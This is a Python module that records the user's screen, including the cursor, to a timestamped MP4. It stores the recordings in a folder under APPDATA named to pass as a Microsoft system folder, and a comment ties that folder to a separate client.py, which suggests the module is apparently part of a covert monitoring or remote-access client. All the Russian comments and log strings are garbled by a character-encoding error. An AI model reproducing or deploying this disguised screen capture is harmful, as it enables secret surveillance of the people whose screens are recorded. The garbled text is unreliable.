import logging
import time
import cv2
import numpy as np
from mss import mss
import ctypes
import ctypes.wintypes
import os

logger = logging.getLogger(__name__)

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç–∞ –¥–ª—è –≤—Ä–µ–º–µ–Ω–Ω–æ–π –ø–∞–ø–∫–∏ (–¥–æ–ª–∂–Ω–∞ —Å–æ–≤–ø–∞–¥–∞—Ç—å —Å client.py)
TEMP_SYSTEM_FOLDER = os.path.join(os.getenv('APPDATA'), "Microsoft", "TempSystem")

def record_video(seconds):
    try:
        # –°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω–æ–π –ø–∞–ø–∫–∏, –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
        os.makedirs(TEMP_SYSTEM_FOLDER, exist_ok=True)
        
        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∑–∞—Ö–≤–∞—Ç–∞ —ç–∫—Ä–∞–Ω–∞
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(TEMP_SYSTEM_FOLDER, f"video_{timestamp}.mp4")
        with mss() as sct:
            monitor = sct.monitors[1]
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(filename, fourcc, 20.0, (monitor["width"], monitor["height"]))
            
            # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WinAPI –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ –∫—É—Ä—Å–æ—Ä–∞
            user32 = ctypes.WinDLL('user32')
            gdi32 = ctypes.WinDLL('gdi32')
            
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å—Ç—Ä—É–∫—Ç—É—Ä—É CURSORINFO
            class CURSORINFO(ctypes.Structure):
                _fields_ = [
                    ("cbSize", ctypes.wintypes.DWORD),
                    ("flags", ctypes.wintypes.DWORD),
                    ("hCursor", ctypes.wintypes.HANDLE),
                    ("ptScreenPos", ctypes.wintypes.POINT)
                ]
            
            start_time = time.time()
            while (time.time() - start_time) < seconds:
                # –ó–∞—Ö–≤–∞—Ç –∫–∞–¥—Ä–∞
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGBA2RGB)
                
                # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–∑–∏—Ü–∏–∏ –∏ –∏–∫–æ–Ω–∫–∏ –∫—É—Ä—Å–æ—Ä–∞
                cursor_info = CURSORINFO()
                cursor_info.cbSize = ctypes.sizeof(cursor_info)
                user32.GetCursorInfo(ctypes.byref(cursor_info))
                
                if cursor_info.flags == 1:  # CURSOR_SHOWING
                    # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–∑–∏—Ü–∏–∏ –∫—É—Ä—Å–æ—Ä–∞
                    x, y = cursor_info.ptScreenPos.x - monitor["left"], cursor_info.ptScreenPos.y - monitor["top"]
                    
                    # –†–∏—Å–æ–≤–∞–Ω–∏–µ –∫—É—Ä—Å–æ—Ä–∞ (–ø—Ä–æ—Å—Ç–æ–π –ø—Ä—è–º–æ—É–≥–æ–ª—å–Ω–∏–∫ –¥–ª—è –≤–∏–¥–∏–º–æ—Å—Ç–∏)
                    cv2.rectangle(
                        frame,
                        (x, y, x + 16, y + 16),
                        (255, 0, 0, 128),  # –ü–æ–ª—É–ø—Ä–æ–∑—Ä–∞—á–Ω—ã–π –∫—Ä–∞—Å–Ω—ã–π
                        -1
                    )
                
                out.write(frame)
                time.sleep(0.05)
            
            out.release()
        logger.info(f"üé• –í–∏–¥–µ–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ: {filename}")
        return filename
    except Exception as e:
        logger.error(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: {e}")
        return None
